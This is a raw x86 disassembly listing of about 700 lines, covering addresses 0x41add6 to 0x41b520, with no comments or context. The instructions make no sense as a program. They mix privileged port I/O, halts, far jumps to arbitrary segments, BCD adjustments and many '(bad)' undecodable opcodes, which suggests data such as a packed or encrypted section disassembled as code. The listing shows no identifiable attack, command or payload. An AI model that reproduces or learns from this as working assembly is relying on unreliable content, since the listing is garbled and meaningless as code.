  41add6:	shr    DWORD PTR [edx+0x41148ae9],1
  41addc:	mov    ah,0xfe
  41adde:	mov    bh,0xb9
  41ade0:	push   0xffffffea
  41ade2:	cmp    DWORD PTR [edi+0x57d03e47],esi
  41ade8:	popa   
  41ade9:	loope  0x41ae68
  41adeb:	push   es
  41adec:	out    dx,eax
  41aded:	add    bl,ah
  41adef:	hlt    
  41adf0:	pop    edx
  41adf1:	lea    edi,[ebx+0x6196cde9]
  41adf7:	ja     0x41add8
  41adf9:	or     bh,BYTE PTR [edx-0x58]
  41adfc:	popf   
  41adfd:	add    ecx,DWORD PTR [ecx+0x200dff23]
  41ae03:	mov    ecx,DWORD PTR [ebx]
  41ae05:	aad    0xe4
  41ae07:	cmc    
  41ae08:	into   
  41ae09:	xchg   DWORD PTR [eax],esi
  41ae0b:	pop    ebx
  41ae0c:	data16 cs jg 0x41ae0a
  41ae10:	jnp    0x41add8
  41ae12:	jnp    0x41adb8
  41ae14:	js     0x41ae4c
  41ae16:	repz mov ch,0xff
  41ae19:	fwait
  41ae1a:	imul   edx,DWORD PTR [esi+edx*8-0x72],0x8ecd91f1
  41ae22:	mov    ebp,0x19482f9d
  41ae27:	aaa    
  41ae28:	daa    
  41ae29:	or     eax,0x366a4f3a
  41ae2e:	and    DWORD PTR gs:[edi],esp
  41ae31:	pop    eax
  41ae32:	fadd   DWORD PTR [ebp+0x486cf171]
  41ae38:	mov    al,0xa1
  41ae3a:	inc    edi
  41ae3b:	or     DWORD PTR [esi],0xffffff96
  41ae3e:	repnz add al,0x52
  41ae41:	or     dl,ah
  41ae43:	xor    DWORD PTR [esi+esi*1-0x6b8299b4],0xffffff8c
  41ae4b:	push   ebp
  41ae4c:	rol    DWORD PTR [esi-0x1],cl
  41ae4f:	ins    BYTE PTR es:[edi],dx
  41ae50:	ins    BYTE PTR es:[edi],dx
  41ae51:	push   eax
  41ae52:	mov    ah,0xdf
  41ae54:	pusha  
  41ae55:	pop    eax
  41ae56:	mov    ah,0xc1
  41ae58:	pop    ecx
  41ae59:	sub    BYTE PTR [esp+ecx*2+0x0],bh
  41ae5d:	jae    0x41ae93
  41ae5f:	mov    esi,0xfd5b1de2
  41ae64:	sub    eax,0x88eb98cb
  41ae69:	mul    BYTE PTR [esp+edi*1]
  41ae6c:	outs   dx,BYTE PTR ds:[esi]
  41ae6d:	mov    ebp,DWORD PTR [edx]
  41ae6f:	ins    DWORD PTR es:[edi],dx
  41ae70:	lods   al,BYTE PTR ds:[esi]
  41ae71:	shr    esp,cl
  41ae73:	retf   0x147d
  41ae76:	dec    ecx
  41ae77:	xchg   edx,eax
  41ae78:	(bad)  
  41ae79:	faddp  st(5),st
  41ae7b:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae7e:	adc    ch,BYTE PTR [ecx-0x8]
  41ae81:	mov    esp,0x2ec0fdca
  41ae86:	jno    0x41aee7
  41ae88:	sti    
  41ae89:	xor    al,0x89
  41ae8b:	pop    esp
  41ae8c:	mov    BYTE PTR [esi],0xae
  41ae8f:	scas   eax,DWORD PTR es:[edi]
  41ae90:	or     DWORD PTR [ebx+eax*1],edi
  41ae93:	pop    edi
  41ae94:	dec    ebp
  41ae95:	xlat   BYTE PTR ds:[ebx]
  41ae96:	sti    
  41ae97:	mov    eax,0x172700b3
  41ae9c:	fcomi  st,st(6)
  41ae9e:	leave  
  41ae9f:	int    0xaf
  41aea1:	dec    ebx
  41aea2:	push   eax
  41aea3:	cmp    BYTE PTR [edx],ah
  41aea5:	in     eax,dx
  41aea6:	lahf   
  41aea7:	es fwait
  41aea9:	add    eax,0x8c897b07
  41aeae:	loope  0x41aef8
  41aeb0:	ret    
  41aeb1:	and    DWORD PTR [ecx+edx*1],eax
  41aeb4:	mov    esp,0xb8f49719
  41aeb9:	fldenv [edi]
  41aebb:	out    dx,al
  41aebc:	test   al,0x88
  41aebe:	adc    BYTE PTR [edi-0x69],dl
  41aec1:	call   0xe67a45ee
  41aec6:	xor    ah,BYTE PTR [ecx-0x107c0a17]
  41aecc:	bnd js 0x41ae5b
  41aecf:	mov    ecx,0xe6489800
  41aed4:	jmp    0xecf4acfd
  41aed9:	cli    
  41aeda:	loop   0x41af4a
  41aedc:	cs dec esp
  41aede:	xchg   edx,eax
  41aedf:	and    edx,ebx
  41aee1:	pop    edi
  41aee2:	sar    BYTE PTR [edx+esi*8],0x17
  41aee6:	adc    ebx,ebx
  41aee8:	in     al,dx
  41aee9:	inc    ebx
  41aeea:	mov    bh,0x84
  41aeec:	test   DWORD PTR [ecx-0x67e4215d],ebx
  41aef2:	daa    
  41aef3:	call   0xa855:0x5dc198b0
  41aefa:	inc    ecx
  41aefb:	jo     0x41af78
  41aefd:	mov    bh,0x2a
  41aeff:	inc    edi
  41af00:	dec    ecx
  41af01:	stos   BYTE PTR es:[edi],al
  41af02:	sbb    dh,BYTE PTR [esi]
  41af04:	inc    eax
  41af05:	mov    ah,0xfe
  41af07:	cmp    esp,DWORD PTR [ebp+0x34]
  41af0a:	enter  0xb728,0xe0
  41af0e:	jmp    0x41aef9
  41af10:	shr    DWORD PTR [esi+0x18],1
  41af13:	inc    esp
  41af14:	hlt    
  41af15:	call   0xc45b86e1
  41af1a:	inc    ebp
  41af1b:	inc    edx
  41af1c:	lods   al,BYTE PTR ds:[esi]
  41af1d:	mov    al,ds:0x89e31891
  41af22:	inc    ebx
  41af23:	add    BYTE PTR [esi+ebx*8-0x2],ch
  41af27:	hlt    
  41af28:	mov    al,0xf6
  41af2a:	outs   dx,DWORD PTR ds:[esi]
  41af2b:	pop    ebx
  41af2c:	clc    
  41af2d:	adc    DWORD PTR [ebx],esi
  41af2f:	in     eax,0x7e
  41af31:	in     al,dx
  41af32:	mov    ch,0x89
  41af34:	inc    esp
  41af35:	mov    ah,0x5c
  41af37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af38:	sbb    al,0x79
  41af3a:	xor    ebp,edi
  41af3c:	or     ah,BYTE PTR [eax*4+0x1907304f]
  41af43:	aad    0xa1
  41af45:	mov    WORD PTR [edi+0x57],cs
  41af48:	jo     0x41aed8
  41af4a:	jle    0x41aefa
  41af4c:	ficomp DWORD PTR [esp+edx*8+0xf]
  41af50:	sti    
  41af51:	stos   DWORD PTR es:[edi],eax
  41af52:	(bad)  
  41af53:	push   eax
  41af54:	dec    edx
  41af55:	inc    ebx
  41af56:	xor    DWORD PTR [esi],esp
  41af58:	gs or  bh,dl
  41af5b:	add    eax,0x175f8a3e
  41af60:	sub    ecx,DWORD PTR [edi-0x3acd3179]
  41af66:	test   BYTE PTR [edi+0x356d5f83],ch
  41af6c:	loop   0x41afcc
  41af6e:	xchg   ebx,eax
  41af6f:	and    dl,BYTE PTR [ebp+ecx*8-0x4c]
  41af73:	lods   eax,DWORD PTR ds:[esi]
  41af74:	outs   dx,BYTE PTR ds:[esi]
  41af75:	mov    bl,0x3d
  41af77:	push   eax
  41af78:	stc    
  41af79:	xchg   DWORD PTR [edx+0x71001f2f],edx
  41af7f:	ror    bh,1
  41af81:	jae    0x78d4ec9c
  41af87:	mov    ebx,0xad999ba2
  41af8c:	or     al,0x71
  41af8e:	(bad)
  41af91:	and    al,0xa1
  41af93:	repz jmp 0x23b5:0x3fcb31c6
  41af9b:	aam    0xc7
  41af9d:	in     eax,0x4f
  41af9f:	popw   ds
  41afa1:	rol    DWORD PTR [edi+0x295cae85],0x2a
  41afa8:	xor    ebp,edx
  41afaa:	pop    ebx
  41afab:	jnp    0x41af3f
  41afad:	mov    eax,0xb96c92e3
  41afb2:	push   ebp
  41afb3:	mov    BYTE PTR [edx],ch
  41afb5:	xchg   DWORD PTR [eax-0x13],edi
  41afb8:	jmp    0x52c6:0xa2e383c5
  41afbf:	(bad)  
  41afc0:	mov    dh,0xcf
  41afc2:	fldenv [ebp-0x311c5f24]
  41afc8:	add    eax,0x5b12dc59
  41afcd:	out    dx,eax
  41afce:	retf   
  41afcf:	and    BYTE PTR [edi+0x1de5605f],bh
  41afd5:	mov    esp,0xf15a7ed5
  41afda:	pusha  
  41afdb:	inc    ebp
  41afdc:	cmc    
  41afdd:	and    al,0x2e
  41afdf:	addr16 or al,0x73
  41afe2:	adc    al,0xb0
  41afe4:	scas   eax,DWORD PTR es:[edi]
  41afe5:	mov    al,0xce
  41afe7:	xchg   esi,eax
  41afe8:	mov    ss,WORD PTR [edx+eax*4]
  41afeb:	inc    ebp
  41afec:	sar    DWORD PTR [eiz*1-0x6b6fd160],0x18
  41aff4:	pop    es
  41aff5:	stos   DWORD PTR es:[edi],eax
  41aff6:	or     BYTE PTR [ebp-0x4d08e072],0xee
  41affd:	add    al,0xb4
  41afff:	out    0x35,eax
  41b001:	rcl    BYTE PTR [esi],0x76
  41b004:	retf   0x998a
  41b007:	sbb    eax,0xccd4e0d8
  41b00c:	ror    DWORD PTR [ebx],0x41
  41b00f:	xchg   ebp,eax
  41b010:	mov    DWORD PTR [esi+0x0],eax
  41b013:	and    cl,BYTE PTR [ecx]
  41b015:	inc    ecx
  41b016:	adc    ebp,ebx
  41b018:	jmp    0x41afbc
  41b01a:	push   ds
  41b01b:	aas    
  41b01c:	mov    esi,0xcbe48ec5
  41b021:	jmp    0xc210:0xd06ead20
  41b028:	xchg   esi,eax
  41b029:	sbb    DWORD PTR [edx],ebx
  41b02b:	sbb    ebx,DWORD PTR ds:0x74989826
  41b031:	daa    
  41b032:	lahf   
  41b033:	in     eax,0xb2
  41b035:	sti    
  41b036:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b037:	ret    
  41b038:	push   es
  41b039:	in     eax,0xf1
  41b03b:	pop    esi
  41b03c:	mov    dh,0x61
  41b03e:	mov    esi,0xf3a519b6
  41b043:	cs push esp
  41b045:	jb     0x41afe6
  41b047:	adc    eax,0xfe12931c
  41b04c:	gs retfw 
  41b04f:	call   FWORD PTR [edx-0x3e]
  41b052:	je     0x41b0bd
  41b054:	adc    al,0xd5
  41b056:	adc    eax,0xf7c89b3f
  41b05b:	sbb    BYTE PTR [edi+ecx*8-0x75fe694b],al
  41b062:	retf   
  41b063:	push   edx
  41b064:	add    DWORD PTR [ebx-0x7b987116],eax
  41b06a:	mov    al,0x87
  41b06c:	add    eax,0xb2b51113
  41b071:	dec    dl
  41b073:	out    dx,eax
  41b074:	(bad)  
  41b075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b076:	popa   
  41b077:	push   edi
  41b078:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b079:	je     0x41b025
  41b07b:	cmp    eax,0xfa05f9c4
  41b080:	xchg   BYTE PTR [eax],ah
  41b082:	jle    0x41b02f
  41b084:	sbb    BYTE PTR [ecx],dh
  41b086:	pop    ss
  41b087:	out    dx,eax
  41b088:	xor    eax,0xfb1c7807
  41b08d:	lock mov WORD PTR [edi+esi*8-0x4afbdab3],es
  41b095:	js     0x41b05c
  41b097:	daa    
  41b098:	outs   dx,BYTE PTR ds:[esi]
  41b099:	push   esp
  41b09a:	rcl    DWORD PTR [ecx-0x33010b50],1
  41b0a0:	and    eax,0xd6fad317
  41b0a5:	xchg   esi,eax
  41b0a6:	in     eax,dx
  41b0a7:	inc    ecx
  41b0a8:	or     DWORD PTR [ebx],0xffffffb9
  41b0ab:	lea    esi,[esi+0x54]
  41b0ae:	pop    es
  41b0af:	cmp    bl,BYTE PTR [ebx-0x7e7598b0]
  41b0b5:	test   al,0xaf
  41b0b7:	pop    es
  41b0b8:	retf   
  41b0b9:	adc    DWORD PTR [esi],ebx
  41b0bb:	add    DWORD PTR [ebx-0x47295ad1],0xffffffe6
  41b0c2:	mov    al,ds:0x426dce98
  41b0c7:	outs   dx,DWORD PTR ds:[esi]
  41b0c8:	push   ebx
  41b0c9:	xor    dl,BYTE PTR [esi+0x70]
  41b0cc:	xor    BYTE PTR [edx-0x22cd75ec],ch
  41b0d2:	mov    ebp,0x89e38de8
  41b0d7:	mov    bl,0xf0
  41b0d9:	xor    BYTE PTR [eax],bh
  41b0db:	jmp    0x41b065
  41b0dd:	ins    DWORD PTR es:[edi],dx
  41b0de:	stos   BYTE PTR es:[edi],al
  41b0df:	enter  0x9240,0x4d
  41b0e3:	lock ret 0xae82
  41b0e7:	daa    
  41b0e8:	in     al,0x83
  41b0ea:	inc    esp
  41b0eb:	mov    al,gs:0x60201830
  41b0f1:	retf   
  41b0f2:	cdq    
  41b0f3:	sub    eax,0xbaefb7a1
  41b0f8:	jmp    0x54c7:0x12dddbea
  41b0ff:	rol    DWORD PTR [eax-0x29],1
  41b102:	sahf   
  41b103:	outs   dx,BYTE PTR ds:[esi]
  41b104:	rcr    BYTE PTR [edi],0x20
  41b107:	xchg   DWORD PTR [ebx-0x4300807e],ecx
  41b10d:	xchg   edi,eax
  41b10e:	pop    ss
  41b10f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b111:	shr    bl,cl
  41b113:	addr16 inc edi
  41b115:	xchg   BYTE PTR cs:[ebx+0x6ce956ff],bl
  41b11c:	mov    BYTE PTR [eax+0x67],ch
  41b11f:	adc    ebx,DWORD PTR [edx-0x3b]
  41b122:	(bad)  
  41b123:	imul   ebp,DWORD PTR [edi],0x44
  41b126:	jecxz  0x41b14e
  41b128:	jae    0x41b17b
  41b12a:	(bad)  
  41b12b:	stc    
  41b12c:	scas   eax,DWORD PTR es:[edi]
  41b12d:	fdivr  QWORD PTR [eax+0x435e7803]
  41b133:	ja     0x41b193
  41b135:	mov    cl,ah
  41b137:	inc    edi
  41b138:	loope  0x41b10a
  41b13a:	xchg   ecx,eax
  41b13b:	std    
  41b13c:	scas   al,BYTE PTR es:[edi]
  41b13d:	pop    ss
  41b13e:	xlat   BYTE PTR ds:[ebx]
  41b13f:	out    dx,eax
  41b140:	mov    bh,0x4b
  41b142:	and    ah,dh
  41b144:	pop    eax
  41b145:	div    DWORD PTR [edi]
  41b147:	sbb    al,0x8c
  41b149:	int3   
  41b14a:	mov    esi,0x66d0c1ea
  41b14f:	push   ds
  41b150:	call   DWORD PTR [ecx]
  41b152:	cmp    eax,0xa705f657
  41b157:	jns    0x41b0e4
  41b159:	adc    dl,dl
  41b15b:	js     0x41b192
  41b15d:	scas   al,BYTE PTR es:[edi]
  41b15e:	jns    0x41b1b4
  41b160:	mov    esp,0x388b5439
  41b165:	ss cmc 
  41b167:	mov    ds:0xfe469894,eax
  41b16c:	sub    eax,0x7496b11e
  41b171:	inc    ecx
  41b172:	sbb    BYTE PTR [edx],ah
  41b174:	push   esp
  41b175:	mov    esp,0xb60433cf
  41b17a:	lahf   
  41b17b:	leave  
  41b17c:	mov    al,0xe4
  41b17e:	adc    ebx,edx
  41b180:	in     al,dx
  41b181:	mov    ebp,0xa27768bf
  41b186:	dec    esi
  41b187:	imul   eax,edi,0x2387964b
  41b18d:	loope  0x41b1b5
  41b18f:	mov    ah,0x96
  41b191:	icebp  
  41b192:	pusha  
  41b193:	ret    
  41b194:	addr16 cmp al,0x22
  41b197:	aam    0x81
  41b199:	ss mov ecx,0xa2500536
  41b19f:	jb     0x41b19c
  41b1a1:	retf   
  41b1a2:	mov    al,0xf4
  41b1a4:	dec    ebp
  41b1a5:	adc    eax,DWORD PTR [esp+edi*8-0x3dfaf5a1]
  41b1ac:	int3   
  41b1ad:	mov    ch,0x56
  41b1af:	cmp    BYTE PTR [ecx+0x6c],bh
  41b1b2:	xor    eax,0x9b01ec06
  41b1b7:	mov    bl,0xdd
  41b1b9:	adc    BYTE PTR [esp+ebx*1-0xe],0x2b
  41b1be:	mov    ds:0x42026c18,al
  41b1c3:	or     eax,0x6caaec7a
  41b1c8:	out    dx,al
  41b1c9:	adc    cl,ah
  41b1cb:	dec    edi
  41b1cc:	sbb    dh,BYTE PTR [ebx]
  41b1ce:	sbb    al,0x37
  41b1d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1d1:	cmp    esp,DWORD PTR [ebx-0x61]
  41b1d4:	sub    eax,0x22ab2eb0
  41b1d9:	push   esp
  41b1da:	mov    al,0x50
  41b1dc:	ss out dx,al
  41b1de:	popa   
  41b1df:	ja     0x41b226
  41b1e1:	(bad)  
  41b1e3:	pop    esi
  41b1e4:	out    dx,al
  41b1e5:	inc    esi
  41b1e6:	mov    ch,0x30
  41b1e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1e9:	mov    dl,0x5
  41b1eb:	(bad)  
  41b1ec:	leave  
  41b1ed:	arpl   WORD PTR [ebx-0x37],ax
  41b1f0:	mov    dl,0xb0
  41b1f2:	mov    bh,0x39
  41b1f4:	leave  
  41b1f5:	add    dl,al
  41b1f7:	or     DWORD PTR [edi-0x31],ebx
  41b1fa:	and    ch,BYTE PTR [eax+edi*2]
  41b1fd:	cmp    al,BYTE PTR [ebp+0x778c1df3]
  41b203:	push   ds
  41b204:	imul   ebx,ecx,0xfffffff0
  41b207:	and    eax,0xe48ee8b3
  41b20c:	fldcw  WORD PTR [edx-0x25a580a5]
  41b212:	mov    edi,0xe1dcd577
  41b217:	mov    ah,0xb6
  41b219:	mov    dh,0x53
  41b21b:	test   al,0x8b
  41b21d:	retf   0x73a1
  41b220:	push   edx
  41b221:	cld    
  41b222:	dec    ecx
  41b223:	pop    ds
  41b224:	repz fucomp st(7)
  41b227:	dec    ebp
  41b228:	mov    ah,dh
  41b22a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b22b:	icebp  
  41b22c:	sbb    eax,0x28cbd8aa
  41b231:	aas    
  41b232:	or     BYTE PTR [ebx-0x3e13fc3f],dh
  41b238:	pop    eax
  41b239:	es mov ecx,0xec508cce
  41b23f:	sar    BYTE PTR [eax-0xe9a231b],cl
  41b245:	sub    eax,ebx
  41b247:	outs   dx,BYTE PTR ds:[esi]
  41b248:	(bad)  
  41b249:	cmp    esi,edi
  41b24b:	cwde   
  41b24c:	scas   eax,DWORD PTR es:[edi]
  41b24d:	fadd   QWORD PTR [edi]
  41b24f:	adc    bl,bh
  41b251:	push   esp
  41b252:	fcom   DWORD PTR [eax+0x58]
  41b255:	sub    al,0xac
  41b257:	enter  0xb633,0x5c
  41b25b:	sbb    eax,esp
  41b25d:	dec    ebp
  41b25e:	mov    edx,DWORD PTR [eax-0x3b]
  41b261:	js     0x41b216
  41b263:	(bad)  [esi]
  41b265:	in     al,dx
  41b266:	mov    dl,0x2c
  41b268:	lods   eax,DWORD PTR ds:[esi]
  41b269:	jp     0x41b2bc
  41b26b:	outs   dx,BYTE PTR ds:[esi]
  41b26c:	xchg   esp,eax
  41b26d:	loopne 0x41b286
  41b26f:	adc    eax,0x348c6374
  41b274:	inc    ecx
  41b275:	add    ebp,esp
  41b277:	in     al,dx
  41b278:	bound  esi,QWORD PTR [eax]
  41b27a:	adc    al,0x19
  41b27c:	xchg   edi,eax
  41b27d:	mov    bl,bh
  41b27f:	lods   eax,DWORD PTR ds:[esi]
  41b280:	jo     0x41b2cb
  41b282:	frstor [edi+0x60]
  41b285:	in     eax,dx
  41b286:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b287:	and    edi,ebx
  41b289:	aad    0xe9
  41b28b:	sbb    ebx,DWORD PTR [edx+0x8ea0f00]
  41b291:	ficom  DWORD PTR [ebp-0xa]
  41b294:	scas   eax,DWORD PTR es:[edi]
  41b295:	and    eax,0xadb9b7f6
  41b29a:	ror    DWORD PTR [ecx+0x52],0xdc
  41b29e:	sub    eax,0xe10f74a6
  41b2a3:	mov    fs,WORD PTR [ebx-0xf]
  41b2a6:	cmp    eax,0xd2bbb6aa
  41b2ab:	xchg   ecx,eax
  41b2ac:	fs mov eax,0xe8be4bb7
  41b2b2:	xchg   edx,eax
  41b2b3:	lds    ecx,FWORD PTR [edx]
  41b2b5:	mov    ah,0x4d
  41b2b7:	fwait
  41b2b8:	aaa    
  41b2b9:	or     eax,0x33b26ac1
  41b2be:	push   ss
  41b2bf:	sub    cl,BYTE PTR [edi-0x47]
  41b2c2:	or     ecx,DWORD PTR [eax+eiz*4]
  41b2c5:	ins    DWORD PTR es:[edi],dx
  41b2c6:	push   ds
  41b2c7:	mov    ebx,0xc9c0cb50
  41b2cc:	or     BYTE PTR [ebp-0x42f1c680],0x66
  41b2d3:	aam    0x8c
  41b2d5:	jl     0x41b274
  41b2d7:	sbb    dl,al
  41b2d9:	fwait
  41b2da:	and    dl,BYTE PTR [esp+eiz*2+0x4f16ce5a]
  41b2e1:	les    ebp,FWORD PTR [edi]
  41b2e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2e4:	mov    edi,0xd2f485b4
  41b2e9:	fld    QWORD PTR [ebx+ebp*1+0xaf57633]
  41b2f0:	in     al,0xa3
  41b2f2:	adc    al,0xe2
  41b2f4:	sbb    BYTE PTR [ecx+0x76a19058],dl
  41b2fa:	jne    0x41b351
  41b2fc:	outs   dx,BYTE PTR ds:[esi]
  41b2fd:	dec    edx
  41b2fe:	xor    al,0x23
  41b300:	test   BYTE PTR [eax-0x1c3fecf2],cl
  41b306:	retf   
  41b307:	jb     0x41b367
  41b309:	adc    al,0x94
  41b30b:	cld    
  41b30c:	xchg   ebp,eax
  41b30d:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41b30f:	dec    esp
  41b310:	xchg   edx,eax
  41b311:	ds xor al,0xf4
  41b314:	sti    
  41b315:	mov    bl,0x46
  41b317:	inc    edx
  41b318:	xchg   edi,eax
  41b319:	out    0xbb,eax
  41b31b:	aad    0x8a
  41b31d:	adc    DWORD PTR [ebx+0x568ca292],0x724defa8
  41b327:	mov    ah,0x94
  41b329:	xlat   BYTE PTR ds:[ebx]
  41b32a:	lock push ecx
  41b32c:	and    BYTE PTR [esi-0x2df3b3d3],0x2
  41b333:	icebp  
  41b334:	inc    ebx
  41b335:	xchg   ecx,eax
  41b336:	sti    
  41b337:	xor    BYTE PTR [ebp+esi*8+0x331c502e],al
  41b33e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b33f:	sub    ah,BYTE PTR [eax]
  41b341:	out    dx,eax
  41b342:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b343:	int3   
  41b344:	clc    
  41b345:	ficom  DWORD PTR [esi-0x55]
  41b348:	or     eax,DWORD PTR [edi-0x69]
  41b34b:	xchg   ecx,eax
  41b34c:	jnp    0x41b34e
  41b34e:	ja     0x41b38b
  41b350:	or     dh,BYTE PTR [edx+esi*4]
  41b353:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b355:	(bad)  
  41b356:	mov    al,dl
  41b358:	bound  ebx,QWORD PTR [ebp-0x63cf3a0c]
  41b35e:	ja     0x41b3db
  41b360:	jae    0x41b2f6
  41b362:	ret    0x4ba
  41b365:	hlt    
  41b366:	inc    esi
  41b367:	aas    
  41b368:	or     al,BYTE PTR [eax+0x60]
  41b36b:	stos   DWORD PTR es:[edi],eax
  41b36c:	sahf   
  41b36d:	ds (bad) 
  41b36f:	rcl    BYTE PTR [ebx+0x75],1
  41b372:	mov    esp,0x29884683
  41b377:	lock push ds
  41b379:	push   cs
  41b37a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b37b:	dec    eax
  41b37c:	in     eax,0x75
  41b37e:	jp     0x41b3c4
  41b380:	and    DWORD PTR [edx-0x20ff3ba0],esi
  41b386:	retf   0xcba8
  41b389:	add    DWORD PTR [esi-0x4e],edi
  41b38c:	out    dx,eax
  41b38d:	jg     0x41b396
  41b38f:	sbb    esp,esi
  41b391:	or     esi,DWORD PTR [edx+0x7bca62a]
  41b397:	pop    ss
  41b398:	and    ecx,DWORD PTR [edi*4+0x2db5ed39]
  41b39f:	call   0xabac0798
  41b3a4:	out    dx,al
  41b3a5:	sbb    al,0xed
  41b3a7:	sub    al,BYTE PTR [edi+0x2c]
  41b3aa:	cmp    BYTE PTR [ecx+esi*2+0x29],cl
  41b3ae:	cwde   
  41b3af:	pop    ebx
  41b3b0:	lock les esi,FWORD PTR [edi-0x7ff3e3ab]
  41b3b7:	mov    esi,0x4ac97f63
  41b3bc:	jo     0x41b417
  41b3be:	addr16 mov al,0xde
  41b3c1:	scas   al,BYTE PTR es:[edi]
  41b3c2:	aad    0x95
  41b3c4:	mov    edi,0xe4897073
  41b3c9:	push   ebp
  41b3ca:	add    bh,bl
  41b3cc:	(bad)  
  41b3cd:	in     eax,0x76
  41b3cf:	mov    edx,0xabf09b6e
  41b3d4:	dec    esi
  41b3d5:	cmp    eax,0x80657568
  41b3da:	retf   0x1c70
  41b3dd:	jl     0x41b3e7
  41b3df:	loopne 0x41b420
  41b3e1:	jns    0x41b3b3
  41b3e3:	jns    0x41b450
  41b3e5:	xchg   edi,eax
  41b3e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3e7:	mov    esi,cs
  41b3e9:	or     ebp,edx
  41b3eb:	add    ch,BYTE PTR [edi-0x267a835c]
  41b3f1:	dec    ebx
  41b3f2:	jne    0x41b3b4
  41b3f4:	cmp    al,0x27
  41b3f6:	xchg   esp,eax
  41b3f7:	xchg   ecx,eax
  41b3f8:	jno    0x41b381
  41b3fa:	outs   dx,BYTE PTR ds:[esi]
  41b3fb:	push   esp
  41b3fc:	ins    BYTE PTR es:[edi],dx
  41b3fd:	fisttp QWORD PTR fs:[ecx]
  41b400:	inc    ebx
  41b401:	loope  0x41b447
  41b403:	mov    ah,0x8c
  41b405:	mov    ebx,0x1d841516
  41b40a:	jae    0x41b3dd
  41b40c:	mov    eax,ds:0x32542fa1
  41b411:	sub    BYTE PTR [eax-0x55],cl
  41b414:	pusha  
  41b415:	jne    0x41b48f
  41b417:	adc    ah,BYTE PTR [ecx-0x1a46d956]
  41b41d:	jmp    0xce79783a
  41b422:	out    0x26,al
  41b424:	cmc    
  41b425:	aad    0xf7
  41b427:	daa    
  41b428:	addr16 xor al,0x77
  41b42b:	pushf  
  41b42c:	xchg   esp,eax
  41b42d:	pop    esp
  41b42e:	xlat   BYTE PTR ds:[ebx]
  41b42f:	fst    QWORD PTR [ecx+0x2e25d28b]
  41b435:	fsubr  QWORD PTR [eax]
  41b437:	ret    
  41b438:	aas    
  41b439:	es jecxz 0x41b3bd
  41b43c:	bound  edx,QWORD PTR [ecx+ebp*2]
  41b43f:	jmp    0x41b3e3
  41b441:	xchg   esp,eax
  41b442:	mov    bl,0x6
  41b444:	pop    ds
  41b445:	iret   
  41b446:	cmp    bl,ch
  41b448:	xor    eax,0xede28607
  41b44d:	add    ecx,DWORD PTR [ebx+0x78]
  41b450:	repnz nop
  41b452:	push   ds
  41b453:	cmp    edi,DWORD PTR [esi-0x32]
  41b456:	add    BYTE PTR [esi-0x6c658cfa],ah
  41b45c:	mov    es,WORD PTR [ebp+0x77]
  41b45f:	cmp    al,0x8a
  41b461:	xchg   edx,eax
  41b462:	(bad)  
  41b463:	sti    
  41b464:	sar    ebx,1
  41b466:	(bad)  
  41b467:	(bad)  
  41b468:	fadd   DWORD PTR [eax+0x3ed34b34]
  41b46e:	adc    al,0xb6
  41b470:	mov    al,ds:0x8194c62e
  41b475:	pop    eax
  41b476:	fcomp  DWORD PTR [esi+0x42]
  41b479:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b47a:	loopne 0x41b4e9
  41b47c:	sub    eax,0x4384699f
  41b481:	clc    
  41b482:	imul   ecx,esi,0x8ba971d7
  41b488:	mov    bh,0x5e
  41b48a:	push   0x34
  41b48c:	mov    esi,0x5c75444a
  41b491:	jbe    0x41b433
  41b493:	imul   dl
  41b495:	add    al,0xe7
  41b497:	js     0x41b4eb
  41b499:	loope  0x41b456
  41b49b:	jo     0x41b501
  41b49d:	cmp    al,0x4a
  41b49f:	cmp    ch,bh
  41b4a1:	in     al,0xf7
  41b4a3:	xchg   ebp,esp
  41b4a5:	xchg   ebx,eax
  41b4a6:	neg    dh
  41b4a8:	in     al,dx
  41b4a9:	xchg   DWORD PTR [eax],edi
  41b4ab:	jecxz  0x41b4b5
  41b4ad:	imul   ebx,esi,0x7aaab87d
  41b4b3:	jnp    0x41b468
  41b4b5:	loop   0x41b469
  41b4b7:	test   edx,0xa2cfb9f3
  41b4bd:	imul   edi,DWORD PTR [ebx],0x1641b973
  41b4c3:	inc    eax
  41b4c4:	mov    dh,0xe9
  41b4c6:	fsubrp st(1),st
  41b4c8:	and    al,0x96
  41b4ca:	mov    esi,DWORD PTR [eax]
  41b4cc:	jl     0x41b480
  41b4ce:	sub    al,0xdf
  41b4d0:	call   0x20255897
  41b4d5:	lods   eax,DWORD PTR ds:[esi]
  41b4d6:	cmp    al,0xcd
  41b4d8:	loopne 0x41b478
  41b4da:	pop    ebp
  41b4db:	add    BYTE PTR [edi],bl
  41b4dd:	adc    al,0x98
  41b4df:	sub    al,ah
  41b4e1:	mov    esi,0x3433a974
  41b4e6:	aam    0xa4
  41b4e8:	mov    edx,0xd9dcda64
  41b4ed:	lahf   
  41b4ee:	ret    0xb414
  41b4f1:	clc    
  41b4f2:	in     al,0x9c
  41b4f4:	cmp    al,0x84
  41b4f6:	sar    DWORD PTR [ecx+0x1f],0xca
  41b4fa:	mov    dl,0xf1
  41b4fc:	and    al,0x34
  41b4fe:	in     al,0x90
  41b500:	dec    ebp
  41b501:	dec    esi
  41b502:	mov    edi,DWORD PTR [eax+0x2e1a092e]
  41b508:	dec    esp
  41b509:	cmove  esp,DWORD PTR [edi]
  41b50c:	ret    0x484f
  41b50f:	nop
  41b510:	jno    0x41b4f5
  41b512:	aam    0xe8
  41b514:	or     eax,0x6137b288
  41b519:	xor    BYTE PTR [ebx+ebx*8+0x302332e1],cl
  41b520:	mov    edi,0xa8581e3c
